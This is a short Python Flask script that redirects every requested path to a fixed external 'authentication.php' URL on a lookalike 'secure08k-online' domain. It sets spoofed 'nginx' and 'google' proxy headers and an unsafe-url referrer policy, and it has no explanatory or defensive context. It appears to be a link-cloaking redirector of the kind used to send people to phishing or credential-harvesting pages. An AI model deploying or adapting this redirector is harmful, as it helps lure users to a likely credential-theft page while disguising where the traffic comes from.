import requests
from flask import Flask,redirect,make_response



app = Flask(__name__)


@app.route('/<name>')
def hello(name):


    url = 'https://secure08k-online.preview-domain.com/authentication.php?token=kq74faw'
    r = make_response(redirect(f"{url}", code=301))
    r.headers.set('alt-svc', "clear")
    r.headers.set('cache-control', "private, max-age=90")
    r.headers.set('content-security-policy', "referrer always;")
    r.headers.set('referrer-policy', "unsafe-url")
    r.headers.set('server', "nginx")
    r.headers.set('via', "1.1 google")
    return r,301




if __name__ == '__main__':
    # Bind to PORT if defined, otherwise default to 5000.
    app.run(host='0.0.0.0', port=int('5000'))
